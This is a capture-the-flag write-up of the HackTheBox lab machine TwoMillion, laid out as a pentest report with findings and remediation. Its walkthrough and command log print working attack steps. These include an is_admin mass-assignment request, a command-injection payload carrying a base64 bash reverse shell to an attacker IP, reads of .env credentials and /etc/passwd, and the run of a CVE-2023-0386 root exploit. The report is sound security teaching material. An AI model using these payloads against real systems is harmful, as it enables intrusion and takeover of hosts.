# TwoMillion Report

| Difficulty | OS    | Category |
| ---------- | ----- | -------- |
| Easy       | Linux | Web/API  |

> Writeup of a retired TwoMillion machine, published for educational/portfolio purposes.

---

## Table of Contents

- [Executive Summary](#executive-summary)
- [Scope](#scope)
- [Approach / Methodology](#approach--methodology)
- [Tools Used](#tools-used)
- [Assessment Summary (Findings Overview)](#assessment-summary-findings-overview)
- [Attack Chain Walkthrough](#attack-chain-walkthrough)
- [Technical Findings Details](#technical-findings-details)
- [Remediation Summary](#remediation-summary)
- [Lessons Learned / Skills Demonstrated](#lessons-learned--skills-demonstrated)
- [Appendix](#appendix)
  * [A. Finding Severity Definitions](#a-finding-severity-definitions)
  * [B. Exploited Hosts](#b-exploited-hosts)
  * [C. Compromised Users / Credentials](#c-compromised-users--credentials)
  * [D. Command Reference Log](#d-command-reference-log)
  * [E. References](#e-references)

---

## Executive Summary

**Target:** `TwoMillion / IP: 10.129.229.66` **Platform:** `HackTheBox` **Date Completed:** `2026-09-20` **Assessment Type:** `Web Application` **Approach:** `Black box` — tested with `no prior knowledge`.

TwoMillion is a mock recreation of the HackTheBox "2 Million Users" landing page. Enumeration of the site's frontend JavaScript revealed hidden, undocumented API endpoints used to generate registration invite codes. A mass assignment vulnerability in the account settings API allowed a standard registered user to elevate themselves to an administrator. As an admin, an OS command injection vulnerability in the VPN configuration generation endpoint was exploited to gain a remote shell as `www-data`. Database credentials found in a `.env` file were reused via SSH to obtain a foothold as the `admin` user. Privilege escalation to `root` was achieved by exploiting a known OverlayFS/FUSE kernel vulnerability (CVE-2023-0386) affecting the unpatched Ubuntu 22.04 (Jammy) kernel. Full compromise of the host was achieved, capturing both user and root flags.

---

## Scope

| Host / URL / IP Address           | Description                          |
| ---------------------------------- | ------------------------------------ |
| `10.129.229.66` / `2million.htb`   | Target machine — Linux/Web (nginx, PHP API) |

> Testing was restricted to the host(s) listed above, consistent with the platform's rules of engagement.

---

## Approach / Methodology

1. **Reconnaissance** — passive/active information gathering on the target.
2. **Scanning & Enumeration** — port/service discovery, vhost discovery, and frontend JS analysis.
3. **Vulnerability Analysis** — identifying an undocumented API, mass assignment, and command injection.
4. **Exploitation** — gaining an initial foothold via authenticated RCE.
5. **Privilege Escalation** — moving from low-privilege access to root via a kernel exploit.
6. **Post-Exploitation** — validating impact, capturing flags/evidence.

---

## Tools Used

| Tool         | Purpose                                          |
| ------------ | ------------------------------------------------- |
| `nmap`       | Port and service scanning                          |
| `curl` / `jq`| API endpoint enumeration and interaction           |
| `Burp Suite` | Intercepting requests, capturing session cookies   |
| `de4js`      | Deobfuscating packed/minified JavaScript           |
| `base64` / `rot13` | Decoding invite code and API hint data       |
| `netcat`     | Catching the reverse shell                         |
| `ssh` / `scp`| Lateral access and exploit transfer                |
| CVE-2023-0386 PoC (xkaneiki) | OverlayFS/FUSE kernel privilege escalation exploit |

---

## Assessment Summary (Findings Overview)

The overall attack path moved from an exposed, undocumented API through a mass-assignment privilege escalation to admin, then an authenticated OS command injection for initial code execution, followed by credential reuse and a public kernel exploit for full root compromise.

| Severity      | Count |
| ------------- | ----- |
| Critical      | 2     |
| High          | 1     |
| Medium        | 1     |
| Low           | 0     |
| Informational | 0     |

| # | Severity   | Finding Name                                                |
| --- | ---------- | ------------------------------------------------------------ |
| 1 | Critical   | OS Command Injection in Admin VPN Generation Endpoint         |
| 2 | Critical   | Local Privilege Escalation via CVE-2023-0386 (OverlayFS/FUSE) |
| 3 | High       | Mass Assignment / Privilege Escalation via `is_admin` Parameter |
| 4 | Medium     | Plaintext Database Credentials Stored in Web-Readable `.env`  |

*(Full detail on each finding is in the [Technical Findings Details](#technical-findings-details) section below.)*

---

## Attack Chain Walkthrough

> This section documents the full path from unauthenticated access to final compromise, step by step, with commands and evidence. Credentials are shown as they were harmless lab values; the real target IP is a HTB lab address.

### 1.1. Reconnaissance — Port Scanning

```bash
sudo nmap -sC -sV -Pn 10.129.229.66
```

![Nmap scan results](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920181034.png?raw=true)

**Findings:** Two open ports — `22/tcp` (OpenSSH 8.9p1 Ubuntu) and `80/tcp` (nginx). The HTTP service did not follow its redirect, revealing the virtual host `2million.htb`.

### 1.2. Enumeration — Virtual Host Setup & Site Discovery

```bash
echo "10.129.229.66 2million.htb" | sudo tee -a /etc/hosts
```

The site is a recreation of the HackTheBox landing page, with `[join]` and `[login]` links. Clicking "join" routes to `/invite`, which requires an invite code to register.

![2million.htb landing page](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920181258.png?raw=true)
![Invite code entry page](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920181601.png?raw=true)

### 1.3. Enumeration — Deobfuscating the Invite API

The invite page loads `/js/inviteapi.min.js`, which is packed/obfuscated JavaScript. Using [de4js](https://thanhle.io.vn/de4js/), the code was deobfuscated to reveal two functions: `verifyInviteCode()` (POSTs to `/api/v1/invite/verify`) and `makeInviteCode()` (POSTs to `/api/v1/invite/how/to/generate`).

```javascript
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST", dataType: "json", data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) { console.log(response) },
        error: function (response) { console.log(response) }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST", dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) { console.log(response) },
        error: function (response) { console.log(response) }
    })
}
```

**Findings:** An undocumented API exists under `/api/v1/`, offering a path to self-generate a valid invite code without a real invitation.

### 1.4. Initial Foothold Setup — Generating & Decoding the Invite Code

```bash
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
```

![API hint response](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920182613.png?raw=true)

The response's `data` field is ROT13-encoded, decoding to: *"In order to generate the invite code, make a POST request to /api/v1/invite/generate"*.

```bash
curl -sX POST http://2million.htb/api/v1/invite/generate | jq
```

![Generated invite code](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920183056.png?raw=true)

```bash
echo TzBWTEYtM1pYQ0ktSldRVjMtN1ZRSk8= | base64 -d
# Output: O0VLF-3ZXCI-JWQV3-7VQJO
```

The decoded code was submitted on `/invite`, redirecting successfully to `/register`.

![Registration page with valid invite code](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920183313.png?raw=true)

A user was registered with username `test`, email `test@2million.htb`, and a throwaway password, then logged into the dashboard.

![Registration success](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920183503.png?raw=true)
![Authenticated dashboard](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920183602.png?raw=true)

### 1.5. Enumeration — Mapping the Authenticated API

Intercepting the "Connection Pack" button on the VPN access page in Burp Suite showed a `GET /api/v1/user/vpn/generate` request, along with a valid `PHPSESSID` cookie.

![Burp Suite intercepted VPN generate request](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920183826.png?raw=true)

```bash
curl -v 2million.htb/api
```

![401 Unauthorized without a session cookie](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920184110.png?raw=true)

Supplying the captured `PHPSESSID` cookie:

```bash
curl -sv 2million.htb/api --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" | jq
```

![Authenticated API root response](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920184326.png?raw=true)

```bash
curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" | jq
```

![Full API route listing](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920184518.png?raw=true)

**Findings:** The route list exposed several administrative endpoints, including `/api/v1/admin/auth`, `/api/v1/admin/vpn/generate`, and `/api/v1/admin/settings/update` (PUT).

### 1.6. Vulnerability Analysis — Confirming Non-Admin Status

```bash
curl -sv 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" | jq
```

![admin/auth returns false](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920184648.png?raw=true)

```bash
curl -sv -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu"
```

![401 Unauthorized on admin VPN generate](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920184914.png?raw=true)

### 1.7. Exploitation — Mass Assignment to Gain Admin (Finding #3)

```bash
curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" | jq
```

![Missing email parameter error](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920185135.png?raw=true)

```bash
curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" \
  --header "Content-Type: application/json" --data '{"email":"test@2million.htb"}' | jq
```

![Missing is_admin parameter error](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920185443.png?raw=true)

```bash
curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" \
  --header "Content-Type: application/json" --data '{"email":"test@2million.htb", "is_admin": true}' | jq
```

![is_admin must be 0 or 1 error](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920190508.png?raw=true)

```bash
curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" \
  --header "Content-Type: application/json" --data '{"email":"test@2million.htb", "is_admin": 1}' | jq
```

![is_admin successfully set to 1](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920190618.png?raw=true)

```bash
curl 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" | jq
```

![admin/auth now returns true](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920190753.png?raw=true)

**Findings:** The account settings endpoint accepted an attacker-controlled `is_admin` field with no server-side authorization check, elevating the `test` account to administrator.

### 1.8. Exploitation — OS Command Injection (Finding #1)

```bash
curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" \
  --header "Content-Type: application/json" | jq
```

![Missing username parameter](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920192813.png?raw=true)

```bash
curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" \
  --header "Content-Type: application/json" --data '{"username":"test"}'
```

![Valid OVPN configuration returned for username test](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920193123.png?raw=true)

Testing for command injection in the `username` parameter:

```bash
curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" \
  --header "Content-Type: application/json" --data '{"username":"test;id;"}'
```

![id command output confirms command injection](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920193446.png?raw=true)

A netcat listener was started, and a base64-encoded reverse shell payload was injected:

```bash
nc -lvp 1234
```

```bash
# Local payload (base64-encoded before sending)
bash -i >& /dev/tcp/10.10.14.188/1234 0>&1
```

```bash
curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" \
  --header "Content-Type: application/json" \
  --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODgvMTIzNCAwPiYx | base64 -d | bash;"}'
```

![Reverse shell caught as www-data](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920194024.png?raw=true)

**Findings:** The `username` field was passed unsanitized into a shell command (likely via `exec`/`system` when building the OpenVPN client config), enabling arbitrary OS command execution as `www-data`.

### 1.9. Lateral Movement — Credential Discovery & SSH Access

```bash
ls -la
cat .env
```

![.env file with database credentials](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920194134.png?raw=true)

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

```bash
cat /etc/passwd
```

![/etc/passwd showing admin user with a bash shell](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920194312.png?raw=true)

The `DB_PASSWORD` was reused successfully to SSH in as the local `admin` user:

```bash
ssh admin@2million.htb
whoami
cat user.txt
```

![SSH access as admin and user.txt flag](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920194507.png?raw=true)

**User flag:** `687c1f2b36c2432616aad2e70ae864e9`

### 1.10. Privilege Escalation — Identifying CVE-2023-0386 (Finding #2)

```bash
cd /var/mail
ls
cat admin
```

![Internal email referencing an unpatched OverlayFS/FUSE kernel CVE](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920194742.png?raw=true)

The email from `ch4p` to `admin` (cc: `g0blin`) explicitly flags that the host has not been patched against a recent OverlayFS/FUSE kernel vulnerability — [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386).

```bash
uname -a
```

![Kernel version 5.15.70-051570-generic](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920195047.png?raw=true)

```bash
lsb_release -a
```

![Ubuntu 22.04.2 LTS (Jammy)](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920195146.png?raw=true)

**Findings:** The host runs kernel `5.15.70` on Ubuntu 22.04 (Jammy), within the range of kernel versions vulnerable to CVE-2023-0386 (fixed versions for Jammy start at `5.15.0-71.78` and later).

### 1.11. Exploitation — Root via CVE-2023-0386

The [xkaneiki PoC](https://github.com/xkaneiki/CVE-2023-0386) was cloned locally, zipped, and transferred to the target via `scp`:

```bash
git clone https://github.com/xkaneiki/CVE-2023-0386
zip -r cve.zip CVE-2023-0386
scp cve.zip admin@2million.htb:/tmp
```

```bash
cd /tmp
unzip cve.zip
cd /tmp/CVE-2023-0386/
make all
```

```bash
./fuse ./ovlcap/lower ./gc &
./exp
```

![Exploit succeeds, dropping to a root shell](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920200134.png?raw=true)

**Findings:** The exploit abuses a permission-check flaw in the interaction between OverlayFS and FUSE filesystems to escalate from the unprivileged `admin` user directly to `root`.

### 1.12. Post-Exploitation — Root Flag and Evidence Capture

```bash
cd /root
cat root.txt
cat thank_you.json
```

![root.txt flag and thank_you.json contents](https://github.com/nos49/machine_reports/blob/main/htb/intro-to-read-team/twomillion/images/Pasted%20image%2020260920200210.png?raw=true)

**Root flag:** `e5dd8ba5fefbc4d789cb671a6140d248`

`thank_you.json` contained a multi-layer encoded (URL → hex → base64 → XOR, key `HackTheBox`) message from the HackTheBox team celebrating reaching 2 million users, consistent with the box's theme.

---

## Technical Findings Details

### 1. OS Command Injection in Admin VPN Generation Endpoint — Critical

| Field                              | Details                                                                                                                                         |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| **CWE**                            | CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')                                             |
| **CVSS 3.1 Score**                 | 9.9 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`                                                                                             |
| **Description (Incl. Root Cause)** | The `POST /api/v1/admin/vpn/generate` endpoint accepts a `username` parameter that is concatenated, unsanitized, into a shell command (consistent with a PHP `exec()`/`system()` call generating the OpenVPN client config) rather than being passed as a validated argument. |
| **Security Impact**                | An authenticated administrator (achievable via Finding #3) can inject arbitrary shell metacharacters (e.g. `;`, `|`) to execute arbitrary OS commands as the web server user (`www-data`), resulting in full remote code execution and a foothold on the host. |
| **Affected Host(s)**               | 10.129.229.66:80 (`/api/v1/admin/vpn/generate`)                                                                                                 |
| **Remediation**                    | - Never build shell commands via string concatenation with user input.<br>- Use parameterized/argument-array APIs (e.g. `escapeshellarg()`, or an OpenVPN library) instead of shell invocation.<br>- Enforce strict input validation/allow-listing on `username` (e.g. alphanumeric only). |
| **References**                     | [OWASP: OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection) |

**Evidence:**

```
curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=..." \
  --header "Content-Type: application/json" --data '{"username":"test;id;"}'
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Command injection PoC returning `id` output inline with the VPN config generation response.

---

### 2. Local Privilege Escalation via CVE-2023-0386 (OverlayFS/FUSE) — Critical

| Field                              | Details                                                                                                                                         |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| **CWE**                            | CWE-863: Incorrect Authorization                                                                                                                 |
| **CVSS 3.1 Score**                 | 7.8 — `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`                                                                                             |
| **Description (Incl. Root Cause)** | The host runs Ubuntu 22.04 (Jammy) with kernel `5.15.70-051570-generic`, which is vulnerable to CVE-2023-0386, a flaw in how the Linux kernel handles permission checks when copying a capable file from a `nosuid` mount into an OverlayFS mount, allowing a local unprivileged user to escalate to root. |
| **Security Impact**                | Any local user (e.g. `admin`, obtained via Finding #4/credential reuse) can escalate directly to `root`, resulting in full compromise of the host. |
| **Affected Host(s)**               | 10.129.229.66 (local kernel, `admin` user context)                                                                                              |
| **Remediation**                    | - Apply the vendor kernel patch/update to a fixed kernel version (Jammy fixed in `5.15.0-71.78` and later, per Ubuntu's advisory).<br>- Establish a regular OS/kernel patch management cadence.<br>- Restrict unprivileged local shell access where not required. |
| **References**                     | [CVE-2023-0386 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-0386), [Ubuntu Security Notice — CVE-2023-0386](https://ubuntu.com/security/CVE-2023-0386), MITRE ATT&CK: T1068 — Exploitation for Privilege Escalation |

**Evidence:**

```
./fuse ./ovlcap/lower ./gc &
./exp
[+] exploit success!
root@2million:/tmp/CVE-2023-0386# whoami
root
```

Root shell obtained via the CVE-2023-0386 PoC.

> **Note on CVEs:** This finding maps directly to a known, publicly disclosed CVE in a versioned third-party component (the Linux kernel), so a CVE identifier is included above.

---

### 3. Mass Assignment / Privilege Escalation via `is_admin` Parameter — High

| Field                              | Details                                                                                                                                         |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| **CWE**                            | CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes                                                        |
| **CVSS 3.1 Score**                 | 8.1 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`                                                                                             |
| **Description (Incl. Root Cause)** | The `PUT /api/v1/admin/settings/update` endpoint accepts a JSON body that is bound directly to the user model without restricting which fields a caller may set. A standard authenticated user could include an `is_admin` field in the request body and have it persisted, despite having no legitimate authorization to modify it. |
| **Security Impact**                | Any registered, low-privileged user can self-elevate to an administrator account, gaining access to all administrative API functionality (including the vulnerable VPN generation endpoint in Finding #1). |
| **Affected Host(s)**               | 10.129.229.66:80 (`/api/v1/admin/settings/update`)                                                                                              |
| **Remediation**                    | - Explicitly allow-list which fields a given role/endpoint may update (never bind the full request body to a model).<br>- Enforce server-side authorization checks on privileged fields such as `is_admin`, independent of what is submitted in the payload.<br>- Apply the principle of least privilege to newly registered accounts. |
| **References**                     | [OWASP: Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html) |

**Evidence:**

```
PUT /api/v1/admin/settings/update
{"email":"test@2million.htb", "is_admin": 1}
→ {"id": 13, "username": "test", "is_admin": 1}

GET /api/v1/admin/auth → {"message": true}
```

---

### 4. Plaintext Database Credentials Stored in Web-Readable `.env` — Medium

| Field                              | Details                                                                                                                                         |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| **CWE**                            | CWE-256: Plaintext Storage of a Password / CWE-798: Use of Hard-coded Credentials                                                                |
| **CVSS 3.1 Score**                 | 7.5 — `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`                                                                                             |
| **Description (Incl. Root Cause)** | Once code execution was obtained as `www-data`, a `.env` file in the web root was directly readable and contained the production database credentials (`DB_USERNAME=admin`, `DB_PASSWORD=SuperDuperPass123`) in plaintext. This password was found to be reused as the OS-level SSH password for the `admin` Linux user. |
| **Security Impact**                | Combined with the web server compromise, this exposed a password that was reused for SSH login, allowing direct lateral movement from a web shell to an interactive OS-level account (`admin`), bypassing the need for further exploitation to obtain a stable foothold. |
| **Affected Host(s)**               | 10.129.229.66 (webroot `.env`; SSH service on port 22)                                                                                          |
| **Remediation**                    | - Store secrets in a secrets manager or environment variables outside the web-served directory tree.<br>- Never reuse application/service account passwords for OS-level user accounts.<br>- Restrict file permissions on `.env` so it is not readable by the web server process user beyond what's required. |
| **References**                     | [OWASP: Credential Stuffing / Password Reuse Guidance](https://owasp.org/www-community/attacks/Credential_stuffing) |

**Evidence:**

```
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```
---

## Remediation Summary

### Short Term

- **Finding #1 (OS Command Injection)** – Immediately patch the VPN generation endpoint to sanitize/allow-list the `username` parameter; disable the endpoint until fixed if necessary.
- **Finding #3 (Mass Assignment)** – Remove `is_admin` (and any other privileged field) from the set of fields bindable via the settings-update endpoint.
- **Finding #4 (Plaintext Credentials)** – Rotate the exposed database/SSH password immediately and remove password reuse between the application and OS accounts.

### Medium Term

- **Finding #2 (Kernel CVE)** – Patch the host to a kernel version that resolves CVE-2023-0386, and re-verify against other CVEs referenced in the internal email thread.
- **Finding #3 (Mass Assignment)** – Introduce a formal API schema/DTO validation layer server-side so request bodies cannot silently expand into internal model fields.

### Long Term

- Establish a recurring vulnerability assessment and kernel/OS patch management process.
- Adopt secure coding standards/training around command execution, mass assignment, and secrets handling for the API development team.
- Introduce automated dependency and API-endpoint security scanning in the CI/CD pipeline.

---

## Lessons Learned / Skills Demonstrated

**JavaScript Deobfuscation & API Discovery:** Successfully deobfuscated packed/minified frontend JavaScript to uncover undocumented API functionality, then used the discovered API to bootstrap account registration.

**API Enumeration & Session Reuse:** Leveraged Burp Suite to capture a valid session cookie and systematically enumerated an undocumented REST API tree to identify privileged administrative endpoints.

**Mass Assignment Exploitation:** Identified and exploited a mass-assignment flaw to self-escalate a standard account to administrator by iteratively fuzzing a PUT endpoint's expected JSON schema through server error messages.

**OS Command Injection & Reverse Shell Delivery:** Diagnosed a shell-based backend integration point, confirmed injection via `id`, and delivered a base64-encoded reverse shell payload to obtain code execution.

**Credential Reuse Identification:** Recognized and exploited a password reuse pattern between a database service account and an OS-level SSH account.

**Public Exploit Adaptation:** Identified an applicable public kernel CVE (CVE-2023-0386) from an in-scope OSINT source (an internal email), compiled and executed a third-party PoC exploit to escalate to root.

---

## Appendix

### A. Finding Severity Definitions

| Rating       | Definition                                                                                     |
| ------------ | ----------------------------------------------------------------------------------------------- |
| **Critical** | Exploitation leads to full system/domain compromise with little to no effort or prerequisites. |
| **High**     | Exploitation causes substantial harm to confidentiality, integrity, or availability.           |
| **Medium**   | Exploitation has a moderate impact, or a high-impact issue with limited exposure.              |
| **Low**      | Exploitation causes minimal impact to operations.                                              |
| **Info**     | An observation or improvement opportunity; not itself a vulnerability.                         |

### B. Exploited Hosts

| Host              | Method                                       | Notes                     |
| ------------------ | --------------------------------------------- | -------------------------- |
| `10.129.229.66`     | Mass assignment → OS command injection (RCE) | Initial access as `www-data` |
| `10.129.229.66`     | Credential reuse (SSH)                        | Lateral move to `admin`    |
| `10.129.229.66`     | CVE-2023-0386 (OverlayFS/FUSE)                | Privilege escalation to `root` |

### C. Compromised Users / Credentials

| Username | Method                                        | Notes                                  |
| -------- | ---------------------------------------------- | --------------------------------------- |
| `test`   | Self-registration via leaked invite-generation API | Standard user, later self-elevated to admin |
| `www-data` | OS command injection via VPN generate endpoint | Web server process user                |
| `admin`  | Password reuse (`.env` DB password → SSH)      | Interactive shell, `user.txt` captured  |
| `root`   | CVE-2023-0386 (OverlayFS/FUSE) exploit         | Full compromise, `root.txt` captured    |

### D. Command Reference Log

```bash
sudo nmap -sC -sV -Pn 10.129.229.66
echo "10.129.229.66 2million.htb" | sudo tee -a /etc/hosts
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
curl -sX POST http://2million.htb/api/v1/invite/generate | jq
echo TzBWTEYtM1pYQ0ktSldRVjMtN1ZRSk8= | base64 -d
curl -v 2million.htb/api
curl -sv 2million.htb/api --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" | jq
curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" | jq
curl -sv 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" | jq
curl -sv -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu"
curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" | jq
curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" --header "Content-Type: application/json" --data '{"email":"test@2million.htb"}' | jq
curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" --header "Content-Type: application/json" --data '{"email":"test@2million.htb", "is_admin": true}' | jq
curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" --header "Content-Type: application/json" --data '{"email":"test@2million.htb", "is_admin": 1}' | jq
curl 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" | jq
curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" --header "Content-Type: application/json" | jq
curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" --header "Content-Type: application/json" --data '{"username":"test"}'
curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" --header "Content-Type: application/json" --data '{"username":"test;id;"}'
nc -lvp 1234
curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=set3pc2uk2q85ieogprfa1c3lu" --header "Content-Type: application/json" --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODgvMTIzNCAwPiYx | base64 -d | bash;"}'
ls -la
cat .env
cat /etc/passwd
ssh admin@2million.htb
whoami
cat user.txt
cd /var/mail
ls
cat admin
uname -a
lsb_release -a
git clone https://github.com/xkaneiki/CVE-2023-0386
zip -r cve.zip CVE-2023-0386
scp cve.zip admin@2million.htb:/tmp
cd /tmp && unzip cve.zip && cd /tmp/CVE-2023-0386/ && make all
./fuse ./ovlcap/lower ./gc &
./exp
cd /root
cat root.txt
cat thank_you.json
```

### E. References

- [MITRE ATT&CK: T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK: T1068 — Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)
- [MITRE ATT&CK: T1078 — Valid Accounts](https://attack.mitre.org/techniques/T1078/)
- [Official HackTheBox Machine Page — TwoMillion](https://app.hackthebox.com/machines/TwoMillion)
- [CVE-2023-0386 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-0386)
- [Ubuntu Security — CVE-2023-0386 affected kernel versions](https://ubuntu.com/security/CVE-2023-0386)
- [xkaneiki CVE-2023-0386 PoC](https://github.com/xkaneiki/CVE-2023-0386)

> **Note on CVEs:** One finding (Privilege Escalation, CVE-2023-0386) is a known vulnerability in a versioned third-party component (the Linux kernel) and is cited accordingly. The remaining findings (command injection, mass assignment, credential exposure) are custom application logic flaws specific to this target and are not associated with a CVE.
